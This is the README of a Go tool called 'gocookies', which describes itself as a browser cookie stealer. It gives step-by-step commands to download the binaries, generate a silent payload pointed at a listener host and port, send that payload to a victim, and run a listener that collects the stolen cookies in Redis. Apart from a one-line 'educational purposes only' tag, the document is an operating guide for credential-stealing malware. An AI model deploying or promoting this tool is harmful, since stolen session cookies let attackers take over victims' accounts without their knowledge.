# gocookies
**[For educational purposes only]** </br>
A browser cookie stealer written in Go.</br>
There are 3 components to this project:
- gocookies
- gocookies-generate
- gocookies-listener

The generator is used to generate a payload that can be sent to the victim. 
It will steal the cookies from the victim's browser and send them to the listener.

The listener is run on the attacker's machine and will receive the cookies from the victim.
It stores the received cookies in a Redis database that will be automatically setup within a Docker container.

## Pre-requisites
- Docker
- Go
- Git

## Getting started
### gocookies-generate
Clone the repository.
```
git clone https://github.com/simonfalke-01/gocookies.git
```
Then, download the latest release.
#### Linux
```
curl https://github.com/simonfalke-01/gocookies/releases/latest/download/generate-linux -o generate && curl https://github.com/simonfalke-01/gocookies/releases/latest/download/listener-linux -o listener && chmod +x generate listener
```
#### macOS
```
curl https://github.com/simonfalke-01/gocookies/releases/latest/download/generate-macos -o generate && curl https://github.com/simonfalke-01/gocookies/releases/latest/download/listener-macos -o listener && chmod +x generate listener
```
Alternatively, you can go to the [releases](https://github.com/simonfalke-01/gocookies/releases/latest/) page and download the binaries manually.

## Generate payload
Ensure you have already cloned the repository and downloaded the latest release. If not, see [Getting started](#getting-started). </br>
The `./generate` command will generate a payload that can be sent to the victim. </br>
It requires the following arguments:
- `-h` - The host of the listener
- `-p` - The port of the listener
- `-d` - The path of the gocookies directory
- `-v` (optional) - Whether the payload generated will print verbose output (normally, the payload does not print any output)

Example:
```
./generate -h localhost -p 8091 -d ~/gocookies/gocookies
```
Where ~/gocookies is the cloned repository. </br>
Then, you may send the payload to the victim.

## Setup listener
Ensure you have already cloned the repository and downloaded the latest release. If not, see [Getting started](#getting-started). </br>
The `./listener` command will setup the listener. </br>
It requires the following arguments:
- `-r` - The port which Redis will be running on
- `-p` - The port which the listener will be running on
- `-e` (optional) - Whether to use an existing Redis container (if not specified, a new Redis container will be created). If specified, `-r` will be the port of the existing Redis container.

Example:
```
./listener -r 8090 -p 8091
```
Then, you may wait for the victim to connect to the listener and send the cookies.

## Build from source
Ensure you have already cloned the repository. If not, see [Getting started](#getting-started). </br>
### Building gocookies-generate
```
cd gocookies-generate
go build
```
### Building gocookies-listener
```
cd gocookies-listener
go build
```